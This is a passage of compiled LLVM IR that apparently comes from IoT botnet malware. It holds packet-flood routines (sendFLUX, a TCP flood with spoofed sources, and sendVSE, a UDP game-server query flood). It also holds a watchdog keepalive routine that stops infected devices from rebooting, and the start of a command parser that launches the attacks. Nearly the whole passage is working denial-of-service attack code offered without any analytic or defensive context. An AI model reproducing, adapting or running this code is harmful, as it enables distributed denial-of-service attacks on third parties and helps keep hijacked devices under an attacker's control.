  %123 = zext i16 %122 to i32
  br label %124

; <label>:124:                                    ; preds = %120, %118
  %125 = phi i32 [ %119, %118 ], [ %123, %120 ]
  %126 = trunc i32 %125 to i16
  %127 = getelementptr inbounds i8, i8* %45, i64 22
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %129, i16* %115, align 4
  %130 = bitcast i8* %45 to i16*
  %131 = getelementptr inbounds i8, i8* %45, i64 2
  %132 = bitcast i8* %131 to i16*
  %133 = load i16, i16* %132, align 2
  %134 = zext i16 %133 to i32
  %135 = call zeroext i16 @csum(i16* nonnull %130, i32 %134)
  %136 = getelementptr inbounds i8, i8* %45, i64 10
  %137 = bitcast i8* %136 to i16*
  store i16 %135, i16* %137, align 2
  %138 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %139 = add nsw i32 %138, %2
  %140 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %141 = getelementptr inbounds i8, i8* %45, i64 12
  %142 = bitcast i8* %141 to i32*
  %143 = getelementptr inbounds i8, i8* %45, i64 4
  %144 = bitcast i8* %143 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %124
  %.0 = phi i32 [ 0, %124 ], [ %.0.be, %.backedge.backedge ]
  %145 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %140, i32 16) #3
  %146 = call i32 @GetRandomIP(i32 %.065)
  %147 = call i32 @htonl(i32 %146) #17
  store i32 %147, i32* %142, align 4
  %148 = call i32 @rand_cmwc()
  %149 = trunc i32 %148 to i16
  store i16 %149, i16* %144, align 4
  %150 = call i32 @rand_cmwc()
  store i32 %150, i32* %59, align 8
  %151 = call i32 @rand_cmwc()
  %152 = trunc i32 %151 to i16
  store i16 %152, i16* %56, align 4
  store i16 0, i16* %115, align 4
  %153 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %153, i16* %115, align 4
  %154 = load i16, i16* %132, align 2
  %155 = zext i16 %154 to i32
  %156 = call zeroext i16 @csum(i16* nonnull %130, i32 %155)
  store i16 %156, i16* %137, align 2
  %157 = icmp eq i32 %.0, %6
  br i1 %157, label %158, label %161

; <label>:158:                                    ; preds = %.backedge
  %159 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %160 = icmp sgt i32 %159, %139
  br i1 %160, label %163, label %.backedge.backedge

; <label>:161:                                    ; preds = %.backedge
  %162 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %161, %158
  %.0.be = phi i32 [ %162, %161 ], [ 0, %158 ]
  br label %.backedge

; <label>:163:                                    ; preds = %158
  call void @llvm.stackrestore(i8* %44)
  br label %164

; <label>:164:                                    ; preds = %18, %163, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendFLUX(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %114

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %114, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #3
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %114, label %31

; <label>:31:                                     ; preds = %27
  %32 = icmp eq i32 %3, 0
  %33 = sub nsw i32 32, %3
  %34 = shl i32 -1, %33
  %.049 = select i1 %32, i32 0, i32 %34
  %35 = sext i32 %4 to i64
  %36 = add nsw i64 %35, 40
  %37 = call i8* @llvm.stacksave()
  %38 = alloca i8, i64 %36, align 16
  %39 = bitcast i8* %38 to %struct.iphdr*
  %40 = getelementptr i8, i8* %38, i64 20
  %41 = bitcast i8* %40 to %struct.tcphdr*
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = call i32 @GetRandomIP(i32 %.049)
  %45 = call i32 @htonl(i32 %44) #17
  %46 = add i32 %4, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %39, i32 %43, i32 %45, i8 zeroext 6, i32 %46)
  %47 = call zeroext i16 @htons(i16 zeroext 5678) #17
  %48 = bitcast i8* %40 to i16*
  store i16 %47, i16* %48, align 4
  %49 = call i32 @rand() #3
  %50 = getelementptr inbounds i8, i8* %38, i64 24
  %51 = bitcast i8* %50 to i32*
  store i32 %49, i32* %51, align 8
  %52 = call i32 @rand_cmwc()
  %53 = getelementptr inbounds i8, i8* %38, i64 28
  %54 = bitcast i8* %53 to i32*
  store i32 %52, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %38, i64 32
  %56 = bitcast i8* %55 to i16*
  %57 = load i16, i16* %56, align 16
  %58 = and i16 %57, 11535
  %59 = or i16 %58, 4688
  store i16 %59, i16* %56, align 16
  %60 = call i32 @rand_cmwc()
  %61 = trunc i32 %60 to i16
  %62 = getelementptr inbounds i8, i8* %38, i64 34
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = getelementptr inbounds i8, i8* %38, i64 36
  %65 = bitcast i8* %64 to i16*
  store i16 0, i16* %65, align 4
  %66 = getelementptr inbounds i8, i8* %38, i64 38
  %67 = bitcast i8* %66 to i16*
  store i16 0, i16* %67, align 2
  br i1 %10, label %68, label %70

; <label>:68:                                     ; preds = %31
  %69 = call i32 @rand_cmwc()
  br label %74

; <label>:70:                                     ; preds = %31
  %71 = trunc i32 %1 to i16
  %72 = call zeroext i16 @htons(i16 zeroext %71) #17
  %73 = zext i16 %72 to i32
  br label %74

; <label>:74:                                     ; preds = %70, %68
  %75 = phi i32 [ %69, %68 ], [ %73, %70 ]
  %76 = trunc i32 %75 to i16
  %77 = getelementptr inbounds i8, i8* %38, i64 22
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %39, %struct.tcphdr* %41)
  store i16 %79, i16* %65, align 4
  %80 = bitcast i8* %38 to i16*
  %81 = getelementptr inbounds i8, i8* %38, i64 2
  %82 = bitcast i8* %81 to i16*
  %83 = load i16, i16* %82, align 2
  %84 = zext i16 %83 to i32
  %85 = call zeroext i16 @csum(i16* nonnull %80, i32 %84)
  %86 = getelementptr inbounds i8, i8* %38, i64 10
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %89 = add nsw i32 %88, %2
  %90 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %91 = getelementptr inbounds i8, i8* %38, i64 12
  %92 = bitcast i8* %91 to i32*
  %93 = getelementptr inbounds i8, i8* %38, i64 4
  %94 = bitcast i8* %93 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %74
  %.0 = phi i32 [ 0, %74 ], [ %.0.be, %.backedge.backedge ]
  %95 = call i64 @sendto(i32 %25, i8* nonnull %38, i64 %36, i32 0, %struct.sockaddr* nonnull %90, i32 16) #3
  %96 = call i32 @GetRandomIP(i32 %.049)
  %97 = call i32 @htonl(i32 %96) #17
  store i32 %97, i32* %92, align 4
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  store i16 %99, i16* %94, align 4
  %100 = call i32 @rand_cmwc()
  store i32 %100, i32* %51, align 8
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  store i16 %102, i16* %48, align 4
  store i16 0, i16* %65, align 4
  %103 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %39, %struct.tcphdr* nonnull %41)
  store i16 %103, i16* %65, align 4
  %104 = load i16, i16* %82, align 2
  %105 = zext i16 %104 to i32
  %106 = call zeroext i16 @csum(i16* nonnull %80, i32 %105)
  store i16 %106, i16* %87, align 2
  %107 = icmp eq i32 %.0, %5
  br i1 %107, label %108, label %111

; <label>:108:                                    ; preds = %.backedge
  %109 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %110 = icmp sgt i32 %109, %89
  br i1 %110, label %113, label %.backedge.backedge

; <label>:111:                                    ; preds = %.backedge
  %112 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %111, %108
  %.0.be = phi i32 [ %112, %111 ], [ 0, %108 ]
  br label %.backedge

; <label>:113:                                    ; preds = %108
  call void @llvm.stackrestore(i8* %37)
  br label %114

; <label>:114:                                    ; preds = %22, %17, %27, %113
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendVSE(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #17
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %68

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %.loopexit, label %31

; <label>:31:                                     ; preds = %28
  %32 = add nsw i32 %4, 1
  %33 = sext i32 %32 to i64
  %34 = tail call noalias i8* @malloc(i64 %33) #3
  %35 = icmp eq i8* %34, null
  br i1 %35, label %.loopexit, label %36

; <label>:36:                                     ; preds = %31
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %34, i8 0, i64 %33, i32 1, i1 false)
  tail call void @RandString(i8* nonnull %34, i32 %4)
  %37 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %38 = add nsw i32 %37, %2
  %39 = sext i32 %4 to i64
  %40 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %41 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer.us.preheader, label %.outer.preheader

.outer.preheader:                                 ; preds = %36
  br label %.outer

.outer.us.preheader:                              ; preds = %36
  br label %.outer.us

.outer.us:                                        ; preds = %.outer.us.backedge, %.outer.us.preheader
  %.075.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %.075.ph.us.be, %.outer.us.backedge ]
  %.074.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %54, %.outer.us.backedge ]
  br label %46

; <label>:42:                                     ; preds = %.us-lcssa.us.us
  %43 = add i32 %.075.ph.us, 1
  br label %.outer.us.backedge

; <label>:44:                                     ; preds = %.us-lcssa.us.us
  %45 = call i32 @usleep(i32 %41) #3
  br label %.outer.us.backedge

.outer.us.backedge:                               ; preds = %44, %42
  %.075.ph.us.be = phi i32 [ %43, %42 ], [ 0, %44 ]
  br label %.outer.us

; <label>:46:                                     ; preds = %.outer.us, %49
  %.074.us.us = phi i32 [ 0, %49 ], [ %.074.ph.us, %.outer.us ]
  %47 = call i64 @sendto(i32 %29, i8* nonnull %34, i64 %39, i32 0, %struct.sockaddr* nonnull %40, i32 16) #3
  %48 = icmp eq i32 %.074.us.us, %5
  br i1 %48, label %49, label %.us-lcssa.us.us

; <label>:49:                                     ; preds = %46
  %50 = call i32 @rand_cmwc()
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %20, align 2
  %52 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %53 = icmp sgt i32 %52, %38
  br i1 %53, label %.loopexit.loopexit, label %46

.us-lcssa.us.us:                                  ; preds = %46
  %54 = add i32 %.074.us.us, 1
  %55 = icmp eq i32 %.075.ph.us, %6
  br i1 %55, label %44, label %42

.outer:                                           ; preds = %.outer.backedge, %.outer.preheader
  %.075.ph = phi i32 [ 0, %.outer.preheader ], [ %.075.ph.be, %.outer.backedge ]
  %.074.ph = phi i32 [ 0, %.outer.preheader ], [ %62, %.outer.backedge ]
  br label %56

; <label>:56:                                     ; preds = %.outer, %59
  %.074 = phi i32 [ 0, %59 ], [ %.074.ph, %.outer ]
  %57 = call i64 @sendto(i32 %29, i8* nonnull %34, i64 %39, i32 0, %struct.sockaddr* nonnull %40, i32 16) #3
  %58 = icmp eq i32 %.074, %5
  br i1 %58, label %59, label %.us-lcssa

; <label>:59:                                     ; preds = %56
  %60 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %61 = icmp sgt i32 %60, %38
  br i1 %61, label %.loopexit.loopexit112, label %56

.us-lcssa:                                        ; preds = %56
  %62 = add i32 %.074, 1
  %63 = icmp eq i32 %.075.ph, %6
  br i1 %63, label %64, label %66

; <label>:64:                                     ; preds = %.us-lcssa
  %65 = call i32 @usleep(i32 %41) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %64, %66
  %.075.ph.be = phi i32 [ %67, %66 ], [ 0, %64 ]
  br label %.outer

; <label>:66:                                     ; preds = %.us-lcssa
  %67 = add i32 %.075.ph, 1
  br label %.outer.backedge

; <label>:68:                                     ; preds = %24
  %69 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.loopexit, label %71

; <label>:71:                                     ; preds = %68
  store i32 1, i32* %10, align 4
  %72 = bitcast i32* %10 to i8*
  %73 = call i32 @setsockopt(i32 %69, i32 0, i32 3, i8* nonnull %72, i32 4) #3
  %74 = icmp slt i32 %73, 0
  br i1 %74, label %.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %71
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.07692 = phi i32 [ %75, %.preheader ], [ 50, %.preheader.preheader ]
  %75 = add nsw i32 %.07692, -1
  %76 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %77 = call i32 @rand_cmwc()
  %78 = xor i32 %77, %76
  call void @srand(i32 %78) #3
  %79 = call i32 @rand() #3
  call void @init_rand(i32 %79)
  %80 = icmp eq i32 %75, 0
  br i1 %80, label %81, label %.preheader

; <label>:81:                                     ; preds = %.preheader
  %82 = icmp eq i32 %3, 0
  %83 = sub nsw i32 32, %3
  %84 = shl i32 -1, %83
  %.077 = select i1 %82, i32 0, i32 %84
  %85 = sext i32 %4 to i64
  %86 = add nsw i64 %85, 28
  %87 = call i8* @llvm.stacksave()
  %88 = alloca i8, i64 %86, align 16
  %89 = bitcast i8* %88 to %struct.iphdr*
  %90 = getelementptr i8, i8* %88, i64 20
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @GetRandomIP(i32 %.077)
  %94 = call i32 @htonl(i32 %93) #17
  %95 = add nsw i64 %85, 8
  %96 = trunc i64 %95 to i32
  call void @makeVSEPacket(%struct.iphdr* nonnull %89, i32 %92, i32 %94, i8 zeroext 17, i32 %96)
  %97 = trunc i64 %95 to i16
  %98 = call zeroext i16 @htons(i16 zeroext %97) #17
  %99 = getelementptr inbounds i8, i8* %88, i64 24
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 8
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = bitcast i8* %90 to i16*
  store i16 %102, i16* %103, align 4
  br i1 %12, label %104, label %106

; <label>:104:                                    ; preds = %81
  %105 = call i32 @rand_cmwc()
  %.pre = load i16, i16* %100, align 8
  br label %110

; <label>:106:                                    ; preds = %81
  %107 = trunc i32 %1 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #17
  %109 = zext i16 %108 to i32
  br label %110

; <label>:110:                                    ; preds = %106, %104
  %.pre-phi = phi i16 [ %107, %106 ], [ 0, %104 ]
  %111 = phi i16 [ %98, %106 ], [ %.pre, %104 ]
  %112 = phi i32 [ %109, %106 ], [ %105, %104 ]
  %113 = trunc i32 %112 to i16
  %114 = getelementptr inbounds i8, i8* %88, i64 22
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = getelementptr inbounds i8, i8* %88, i64 26
  %117 = bitcast i8* %116 to i16*
  store i16 0, i16* %117, align 2
  %118 = call zeroext i16 @checksum_tcp_udp(%struct.iphdr* nonnull %89, i8* %90, i16 zeroext %111, i32 12)
  store i16 %118, i16* %117, align 2
  %119 = getelementptr inbounds i8, i8* %88, i64 28
  call void @RandString(i8* %119, i32 %4)
  %120 = bitcast i8* %88 to i16*
  %121 = getelementptr inbounds i8, i8* %88, i64 2
  %122 = bitcast i8* %121 to i16*
  %123 = load i16, i16* %122, align 2
  %124 = zext i16 %123 to i32
  %125 = call zeroext i16 @csum(i16* nonnull %120, i32 %124)
  %126 = getelementptr inbounds i8, i8* %88, i64 10
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %129 = add nsw i32 %128, %2
  %130 = trunc i64 %86 to i32
  %131 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %132 = getelementptr inbounds i8, i8* %88, i64 4
  %133 = bitcast i8* %132 to i16*
  %134 = getelementptr inbounds i8, i8* %88, i64 12
  %135 = bitcast i8* %134 to i32*
  %136 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer78.us.preheader, label %.outer78.preheader

.outer78.preheader:                               ; preds = %110
  br label %.outer78

.outer78.us.preheader:                            ; preds = %110
  br label %.outer78.us

.outer78.us:                                      ; preds = %.outer78.us.backedge, %.outer78.us.preheader
  %.073.ph.us = phi i32 [ 0, %.outer78.us.preheader ], [ %158, %.outer78.us.backedge ]
  %.0.ph.us = phi i32 [ 0, %.outer78.us.preheader ], [ %.0.ph.us.be, %.outer78.us.backedge ]
  br label %141

; <label>:137:                                    ; preds = %.us-lcssa85.us.us
  %138 = add i32 %.0.ph.us, 1
  br label %.outer78.us.backedge

; <label>:139:                                    ; preds = %.us-lcssa85.us.us
  %140 = call i32 @usleep(i32 %136) #3
  br label %.outer78.us.backedge

.outer78.us.backedge:                             ; preds = %139, %137
  %.0.ph.us.be = phi i32 [ 0, %139 ], [ %138, %137 ]
  br label %.outer78.us

; <label>:141:                                    ; preds = %.outer78.us, %155
  %.073.us.us = phi i32 [ 0, %155 ], [ %.073.ph.us, %.outer78.us ]
  %142 = call i64 @sendto(i32 %69, i8* nonnull %88, i64 32, i32 %130, %struct.sockaddr* nonnull %131, i32 16) #3
  %143 = call i32 @rand_cmwc()
  %144 = trunc i32 %143 to i16
  store i16 %144, i16* %103, align 4
  %145 = call i32 @rand_cmwc()
  %146 = trunc i32 %145 to i16
  store i16 %146, i16* %115, align 2
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %133, align 4
  %149 = call i32 @GetRandomIP(i32 %.077)
  %150 = call i32 @htonl(i32 %149) #17
  store i32 %150, i32* %135, align 4
  %151 = load i16, i16* %122, align 2
  %152 = zext i16 %151 to i32
  %153 = call zeroext i16 @csum(i16* nonnull %120, i32 %152)
  store i16 %153, i16* %127, align 2
  %154 = icmp eq i32 %.073.us.us, %5
  br i1 %154, label %155, label %.us-lcssa85.us.us

; <label>:155:                                    ; preds = %141
  %156 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %157 = icmp sgt i32 %156, %129
  br i1 %157, label %.us-lcssa86.us.loopexit, label %141

.us-lcssa85.us.us:                                ; preds = %141
  %158 = add i32 %.073.us.us, 1
  %159 = icmp eq i32 %.0.ph.us, %6
  br i1 %159, label %139, label %137

.outer78:                                         ; preds = %.outer78.backedge, %.outer78.preheader
  %.073.ph = phi i32 [ 0, %.outer78.preheader ], [ %176, %.outer78.backedge ]
  %.0.ph = phi i32 [ 0, %.outer78.preheader ], [ %.0.ph.be, %.outer78.backedge ]
  br label %160

; <label>:160:                                    ; preds = %.outer78, %173
  %.073 = phi i32 [ 0, %173 ], [ %.073.ph, %.outer78 ]
  %161 = call i64 @sendto(i32 %69, i8* nonnull %88, i64 32, i32 %130, %struct.sockaddr* nonnull %131, i32 16) #3
  %162 = call i32 @rand_cmwc()
  %163 = trunc i32 %162 to i16
  store i16 %163, i16* %103, align 4
  %164 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #17
  store i16 %164, i16* %115, align 2
  %165 = call i32 @rand_cmwc()
  %166 = trunc i32 %165 to i16
  store i16 %166, i16* %133, align 4
  %167 = call i32 @GetRandomIP(i32 %.077)
  %168 = call i32 @htonl(i32 %167) #17
  store i32 %168, i32* %135, align 4
  %169 = load i16, i16* %122, align 2
  %170 = zext i16 %169 to i32
  %171 = call zeroext i16 @csum(i16* nonnull %120, i32 %170)
  store i16 %171, i16* %127, align 2
  %172 = icmp eq i32 %.073, %5
  br i1 %172, label %173, label %.us-lcssa85

; <label>:173:                                    ; preds = %160
  %174 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %175 = icmp sgt i32 %174, %129
  br i1 %175, label %.us-lcssa86.us.loopexit113, label %160

.us-lcssa85:                                      ; preds = %160
  %176 = add i32 %.073, 1
  %177 = icmp eq i32 %.0.ph, %6
  br i1 %177, label %178, label %180

; <label>:178:                                    ; preds = %.us-lcssa85
  %179 = call i32 @usleep(i32 %136) #3
  br label %.outer78.backedge

.outer78.backedge:                                ; preds = %178, %180
  %.0.ph.be = phi i32 [ 0, %178 ], [ %181, %180 ]
  br label %.outer78

; <label>:180:                                    ; preds = %.us-lcssa85
  %181 = add i32 %.0.ph, 1
  br label %.outer78.backedge

.us-lcssa86.us.loopexit:                          ; preds = %155
  br label %.us-lcssa86.us

.us-lcssa86.us.loopexit113:                       ; preds = %173
  br label %.us-lcssa86.us

.us-lcssa86.us:                                   ; preds = %.us-lcssa86.us.loopexit113, %.us-lcssa86.us.loopexit
  call void @llvm.stackrestore(i8* %87)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %49
  br label %.loopexit

.loopexit.loopexit112:                            ; preds = %59
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit112, %.loopexit.loopexit, %28, %68, %19, %71, %31, %.us-lcssa86.us
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @ioctl_keepalive() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  %2 = tail call i32 @fork() #3
  store i32 %2, i32* @ioctl_pid, align 4
  %3 = icmp sgt i32 %2, 0
  %4 = icmp eq i32 %2, -1
  %or.cond = or i1 %3, %4
  br i1 %or.cond, label %5, label %6

; <label>:5:                                      ; preds = %0
  ret void

; <label>:6:                                      ; preds = %0
  store i32 1, i32* %1, align 4
  %7 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i64 0, i64 0), i32 2) #3
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %15

; <label>:9:                                      ; preds = %6
  %10 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.99, i64 0, i64 0), i32 2) #3
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %9
  %13 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.100, i64 0, i64 0), i32 2) #3
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %17, label %15

; <label>:15:                                     ; preds = %12, %9, %6
  %.04 = phi i32 [ %7, %6 ], [ %10, %9 ], [ %13, %12 ]
  %16 = call i32 (i32, i64, ...) @ioctl(i32 %.04, i64 2147768068, i32* nonnull %1) #3
  br label %17

; <label>:17:                                     ; preds = %15, %12
  call void @exit(i32 0) #16
  unreachable
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %73

; <label>:6:                                      ; preds = %2
  %7 = icmp slt i32 %0, 6
  br i1 %7, label %.loopexit, label %8

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds i8*, i8** %1, i64 3
  %10 = load i8*, i8** %9, align 8
  %11 = tail call i32 @atoi(i8* %10) #14
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %.loopexit, label %13

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds i8*, i8** %1, i64 2
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @atoi(i8* %15) #14
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %.loopexit, label %18

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds i8*, i8** %1, i64 4
  %20 = load i8*, i8** %19, align 8
  %21 = tail call i32 @atoi(i8* %20) #14
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %.loopexit, label %23

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds i8*, i8** %1, i64 5
  %25 = load i8*, i8** %24, align 8
  %26 = tail call i32 @atoi(i8* %25) #14
  %27 = icmp eq i32 %26, -1
  %28 = icmp sgt i32 %26, 65500
  %29 = or i1 %28, %27
  %30 = icmp sgt i32 %21, 32
  %or.cond202 = or i1 %30, %29
  br i1 %or.cond202, label %.loopexit, label %31

; <label>:31:                                     ; preds = %23
  %32 = icmp eq i32 %0, 7
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %31
  %34 = getelementptr inbounds i8*, i8** %1, i64 6
  %35 = load i8*, i8** %34, align 8
  %36 = tail call i32 @atoi(i8* %35) #14
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.loopexit, label %38

; <label>:38:                                     ; preds = %33, %31
  %39 = getelementptr inbounds i8*, i8** %1, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = tail call i32 @atoi(i8* %15) #14
  %42 = tail call i32 @atoi(i8* %10) #14
  %43 = tail call i32 @atoi(i8* %20) #14
  %44 = tail call i32 @atoi(i8* %25) #14
  %45 = icmp sgt i32 %0, 6
  br i1 %45, label %46, label %.thread212

; <label>:46:                                     ; preds = %38
  %47 = getelementptr inbounds i8*, i8** %1, i64 6
  %48 = load i8*, i8** %47, align 8
  %49 = tail call i32 @atoi(i8* %48) #14
  br i1 %32, label %.thread212, label %50

; <label>:50:                                     ; preds = %46
  %51 = getelementptr inbounds i8*, i8** %1, i64 7
  %52 = load i8*, i8** %51, align 8
  %53 = tail call i32 @atoi(i8* %52) #14
  %54 = icmp sgt i32 %0, 8
  br i1 %54, label %55, label %.thread212

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds i8*, i8** %1, i64 8
